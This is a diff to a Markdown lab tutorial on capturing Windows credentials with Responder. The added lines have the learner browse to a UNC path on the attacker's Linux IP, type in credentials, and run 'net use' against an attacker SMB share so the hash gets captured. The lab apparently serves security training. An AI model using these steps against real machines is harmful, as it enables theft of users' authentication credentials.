@@ -36,13 +36,15 @@ You should see this:
 
 ![](attachments/responderrunning.png)
 
-Let's open **Windows File Explorer** and put in the string **"\\Noooo"** into the address bar at the top.
+Let's open **Windows File Explorer** and put in the string **"\\<Linux-IP>\Noooo"** into the address bar at the top.
 
 ![](attachments/OpeningFileExplorer.png)
 
 ![](attachments/noooaccessbar.png)
 
-Switch back to your **Linux** terminal window.
+It will pop up a windows to write the credentials. Fill them and switch back to your **Linux** terminal window.
+
+
 
 After a few moments, you should see some captured data showing up.  
 
@@ -50,7 +52,11 @@ After a few moments, you should see some captured data showing up.
 
 ![](attachments/captureddata.png)
 
+We can do the same thing from the Windows Terminal by running the following command:
 
+```bash
+net use * \\10.10.102.57\share
+```
 
 
 
